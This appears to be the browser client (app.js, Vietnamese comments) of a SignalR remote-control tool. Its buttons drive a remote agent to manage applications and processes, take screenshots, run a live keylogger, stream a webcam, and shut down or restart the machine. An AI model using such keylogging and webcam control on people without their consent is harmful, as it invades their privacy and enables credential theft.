// =============================================
// Remote Control Client - app.js (SignalR Version)
// DÀNH CHO SERVER ASP.NET CORE + SIGNALR
// =============================================

const connection = new signalR.HubConnectionBuilder()
    .withUrl("/control")
    .configureLogging(signalR.LogLevel.Information)
    .build();

let currentBinary = [];
let binaryType = "";

// KẾT NỐI SIGNALR
connection.on("receive", (data) => {
    console.log("Nhận từ Agent:", data);
    handleResponse(data);
});

connection.on("binary_start", (type) => {
    currentBinary = [];
    binaryType = type;
    console.log("Bắt đầu nhận:", type);
    showStatus(`Đang nhận ${type}...`, "info");
});

connection.on("receiveBinary", (chunk) => {
    currentBinary.push(chunk);
});

connection.on("binary_end", () => {
    if (currentBinary.length === 0) return;
    const blob = new Blob(currentBinary, { type: "image/jpeg" });
    const url = URL.createObjectURL(blob);

    if (binaryType === "screenshot") {
        document.getElementById("screenshot-img").src = url;
        document.getElementById("save-screenshot").style.display = "inline-block";
        showStatus("Đã chụp màn hình!", "success");
    } else if (binaryType === "webcam") {
        document.getElementById("webcam-img").src = url;
        setTimeout(() => URL.revokeObjectURL(url), 100);
    }
    currentBinary = [];
});

connection.start().then(() => {
    console.log("SignalR kết nối thành công!");
    showStatus("Đã kết nối với Agent", "success");
}).catch(err => {
    console.error("Lỗi SignalR:", err);
    showStatus("Lỗi kết nối SignalR!", "danger");
});

// GỬI LỆNH
function sendCommand(action, payload = {}) {
    payload.action = action;
    connection.invoke("SendCommand", payload).catch(err => console.error("Lỗi gửi:", err));
}

// HIỂN THỊ TRẠNG THÁI
function showStatus(msg, type = 'info') {
    const statusEl = document.getElementById('power-status');
    if (statusEl) {
        statusEl.textContent = msg;
        statusEl.className = `status ${type}`;
    }
}

// =============================================
// [1] QUẢN LÝ ỨNG DỤNG
// =============================================
document.getElementById('list-apps')?.addEventListener('click', () => sendCommand("app_list"));

function renderApps(apps) {
    const tbody = document.querySelector('#apps-table tbody');
    tbody.innerHTML = '';
    apps.forEach(app => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${escapeHtml(app)}</td>
            <td>
                <button class="btn success" onclick="startApp('${escapeHtml(app)}')">Start</button>
                <button class="btn danger" onclick="stopApp('${escapeHtml(app)}')">Stop</button>
            </td>
        `;
        tbody.appendChild(tr);
    });
}

function startApp(name) { sendCommand("app_start", { name }); }
function stopApp(name) { sendCommand("app_stop", { name }); }

// =============================================
// [2] QUẢN LÝ TIẾN TRÌNH
// =============================================
document.getElementById('list-processes')?.addEventListener('click', () => sendCommand("process_list"));

function renderProcesses(processes) {
    const tbody = document.querySelector('#processes-table tbody');
    tbody.innerHTML = '';
    processes.forEach(p => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${p.pid}</td>
            <td>${escapeHtml(p.name)}</td>
            <td>${p.cpu}</td>
            <td>${p.mem}</td>
            <td><button class="btn danger" onclick="killProcess(${p.pid})">Dừng</button></td>
        `;
        tbody.appendChild(tr);
    });
}

function killProcess(pid) {
    if (confirm(`Dừng tiến trình PID ${pid}?`)) {
        sendCommand("process_stop", { pid });
    }
}

// Tìm kiếm tiến trình
document.getElementById('process-search')?.addEventListener('input', (e) => {
    const term = e.target.value.toLowerCase();
    document.querySelectorAll('#processes-table tbody tr').forEach(row => {
        const name = row.cells[1].textContent.toLowerCase();
        row.style.display = name.includes(term) ? '' : 'none';
    });
});

// =============================================
// [3] CHỤP MÀN HÌNH
// =============================================
document.getElementById('take-screenshot')?.addEventListener('click', () => {
    sendCommand("screenshot");
    document.getElementById('save-screenshot').style.display = 'none';
    document.getElementById('screenshot-img').src = '';
    showStatus('Đang chụp màn hình...', 'info');
});

document.getElementById('save-screenshot')?.addEventListener('click', () => {
    const img = document.getElementById('screenshot-img');
    const a = document.createElement('a');
    a.href = img.src;
    a.download = `screenshot_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.jpg`;
    a.click();
});

// =============================================
// [4] KEYLOGGER
// =============================================
document.getElementById('start-keylogger')?.addEventListener('click', () => {
    sendCommand("keylogger_start");
    toggleKeylogger(true);
    document.getElementById('keylog-display').textContent = '';
});

document.getElementById('stop-keylogger')?.addEventListener('click', () => {
    sendCommand("keylogger_stop");
    toggleKeylogger(false);
});

document.getElementById('clear-log')?.addEventListener('click', () => {
    document.getElementById('keylog-display').textContent = '';
});

function toggleKeylogger(running) {
    document.getElementById('start-keylogger').disabled = running;
    document.getElementById('stop-keylogger').disabled = !running;
}

// Realtime keylog
connection.on("update", (key) => {
    if (document.querySelector('.tab-btn.active')?.dataset.tab === 'keylogger') {
        const log = document.getElementById('keylog-display');
        log.textContent += key;
        log.scrollTop = log.scrollHeight;
    }
});

// =============================================
// [5] TẮT / KHỞI ĐỘNG LẠI
// =============================================
document.getElementById('shutdown-btn')?.addEventListener('click', () => {
    if (confirm('TẮT máy từ xa?')) sendCommand("shutdown");
});

document.getElementById('restart-btn')?.addEventListener('click', () => {
    if (confirm('KHỞI ĐỘNG LẠI máy từ xa?')) sendCommand("restart");
});

// =============================================
// [6] WEBCAM
// =============================================
document.getElementById('webcam-on')?.addEventListener('click', () => {
    sendCommand("webcam_on");
    document.getElementById('webcam-on').disabled = true;
    document.getElementById('webcam-off').disabled = false;
});

document.getElementById('webcam-off')?.addEventListener('click', () => {
    sendCommand("webcam_off");
    document.getElementById('webcam-on').disabled = false;
    document.getElementById('webcam-off').disabled = true;
});

// =============================================
// XỬ LÝ PHẢN HỒI
// =============================================
function handleResponse(data) {
    const { action, response } = data;

    if (action === 'app_list' && response) renderApps(response);
    if (action === 'process_list' && response) renderProcesses(response);
    if (response === 'ok' && (action === 'shutdown' || action === 'restart')) {
        showStatus(`Đã gửi lệnh ${action === 'shutdown' ? 'tắt máy' : 'khởi động lại'}`, 'success');
    }
}

// UTILS
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// TAB SWITCHING
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(btn.dataset.tab).classList.add('active');
    });
});